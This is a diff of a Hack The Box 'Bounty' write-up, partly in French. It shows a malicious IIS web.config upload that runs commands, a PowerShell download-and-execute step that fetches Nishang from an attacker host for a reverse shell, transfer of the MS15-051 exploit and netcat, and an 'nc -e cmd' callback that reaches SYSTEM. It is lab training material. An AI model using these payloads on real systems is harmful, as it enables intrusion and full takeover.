@@ -1,14 +1,20 @@
-# Bounty
+# HTB - Bounty  10.10.10.93
 
-- Windows 6.1.7600
+- Microsoft Windows Server 2008 R2 Datacenter 
+- 6.1.7600 N/A Build 7600
+- No hotfix
+
 - IIS 7 
 
-- Transfert a IIS 7 web.config RCS
-- MS15-051-64bits.exe
-- ms10_092_schelevator
+- Find an upload page with gobuster
+- Upload IIS 7 web.config RCS
+- MS15-051 : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051: impec
+- ms10_092_schelevator ?
+
 
 ## Walkthrough
 - https://www.boiteaklou.fr/HackTheBox-Bounty.html
+
 
 ## Nmap -> IIS 7.5
 
@@ -27,6 +33,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ## IIS 7.5
 
+![](images/http:__10.10.10.93:80.png)
 Browse /<>
 
 ## dirb
@@ -44,8 +51,8 @@ $ gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-li
 
 ````
 
-=> /transfert.aspx
-
+=> http://10.10.10.93//transfer.aspx
+![](images/http:__10.10.10.93:80_transfer.aspx.png)
 
 ## /transfert.aspx web.config
 
@@ -58,7 +65,7 @@ Upload web.config
 
 Info on IIS 7 web.config : https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
 
-Upload .htaccess files attack : https://github.com/wireghoul/htshells
+Note : Looks like upload .htaccess files attack : https://github.com/wireghoul/htshells
 
 ````
 <?xml version="1.0" encoding="UTF-8"?>
@@ -86,10 +93,13 @@ Response.write("<!-"&"-")
 %>
 
 ````
+
 ````
 http://10.10.10.93/uploadfiles/web.config
-3
+--> 3
 ````
+Working
+
 
 ### Payload : whoami
 ````
@@ -118,6 +128,8 @@ Response.write("Powershell: " & vbCrLf & output & vbCrLf & vbCrLf)
 
 
 ### Payload : download & execute Nishang
+
+Copy Nishang and set a reverse nc command
 ````
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
@@ -137,38 +149,69 @@ Response.write("Powershell: " & vbCrLf & output & vbCrLf & vbCrLf)
       </security>
    </system.webServer>
 </configuration>
-<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
 <%
 Set obj = CreateObject("WScript.Shell")
-obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.30:8000/shell.ps1')")
+obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.32:8000/Invoke-PowerShellTcp.ps1')")
 %>
--->
 ````
-````
-python -m SimpleHTTPServer 80
-nv -lvp 4444
 
-attrib *.* -h -s /s/d   : afiche les fichiers cachés
+Serve Nishang with python 
+```
+# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.93 - - [14/Sep/2019 23:33:07] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+```
+
+Get reverse shell
+```
+# nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.93: inverse host lookup failed: Unknown host
+connect to [10.10.14.32] from (UNKNOWN) [10.10.10.93] 49159
+Windows PowerShell running as user BOUNTY$ on BOUNTY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+```
+
+
+attrib *.* -h -s  : affiche les fichiers cachés
 type user.txt
-
+XXXXXXXXXXXXXXXXXXXXXXXXXXx
 
 ## Escalation
 
-### Sherlock reco
+### Powershell version
+```
+> $PSVersionTable
+
+Name                           Value                                           
+----                           -----                                           
+CLRVersion                     2.0.50727.4927                                  
+BuildVersion                   6.1.7600.16385                                  
+PSVersion                      2.0                                             
+WSManStackVersion              2.0                                             
+PSCompatibleVersions           {1.0, 2.0}                                      
+SerializationVersion           1.1.0.1                                         
+PSRemotingProtocolVersion      2.1     
+```
+
+
+### Sherlock reco.. do nothing...
 
 serve Sherlock
 ````
-curl https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1
+wget  https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
 python -m SimpleHTTPServer
 ````
 
 Download & run it from PS shell
 ````
-IEX (New-Object Net.WebClient).downloadString(‘http://10.10.14.23/priv.ps1’)
+IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32:8000/Sherlock.ps1')
 ````
+????
 
 
-### MS15-051
+
+### MS15-051 :Good exploit
 
 Wget exploit
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
@@ -177,17 +220,32 @@ wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15
 
 
 Transfert file
-New-Object Net.WebClient).DownloadFile(‘http://10.10.14.23/ms15-051×64.exe’,’c:\windows\temp\priv.exe‘
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.32:8000/ms15-051x64.exe', 'c:\windows\temp\priv.exe')
 
 Transfert64bit nc
-New-Object Net.WebClient).DownloadFile(‘http://10.10.14.23/nc64.exe’,’c:\windows\temp\nc.exe‘
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.32:8000/nc64.exe', 'c:\windows\temp\nc.exe')
+
 
 Exploit
-/priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.23 1234"
+cd c:\windows\temp\
+./priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.32 4444"
+
+```
+# nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.93: inverse host lookup failed: Unknown host
+connect to [10.10.14.32] from (UNKNOWN) [10.10.10.93] 49167
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\windows\temp>whoami
+whoami
+nt authority\system
+
+```
 
 
-
-### Other exploit : ms10_092_schelevator
+### Other exploit : ms10_092_schelevator.. à tester
 
 
 Get wordlist from site
